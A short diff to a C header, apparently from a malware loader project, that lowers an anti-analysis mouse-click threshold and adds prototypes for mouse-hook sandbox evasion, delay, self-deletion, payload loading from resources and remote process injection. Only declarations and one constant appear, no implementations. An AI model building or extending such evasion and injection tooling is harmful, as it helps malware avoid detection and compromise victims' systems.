@@ -19,7 +19,7 @@ extern HHOOK g_hMouseHook;
 extern DWORD g_dwMouseClicks;
 
 // Minimum click for passing anti-analysis
-#define REQUIRED_CLICKS 10
+#define REQUIRED_CLICKS 7
 
 /*--------------------------------------------------------------------
   STRUCTURES
@@ -595,10 +595,14 @@ BOOL ReadPayloadFromResource(OUT PVOID* ppPayloadAddress, OUT SIZE_T* pPayloadSi
 INT StringCompareW(IN LPCWSTR String1, IN LPCWSTR String2);
 LPCWSTR LowerCaseStringW(IN LPCWSTR String);
 WCHAR ToLowerCharW(IN WCHAR character);
+SIZE_T StringLengthW(IN LPCWSTR String);
 
 // Defined in Injection.c
 BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* pdwPid, IN HANDLE* phProcess);
 
 // Defined in AntiAnalysis.c
 BOOL SelfDelete();
+LRESULT MouseHookCallback(int nCode, WPARAM wParam, LPARAM lParam);
+BOOL InstallMouseHook();
+BOOL Delay(DWORD dwMilliSeconds);
 BOOL AntiAnalysis(DWORD dwMilliSeconds);
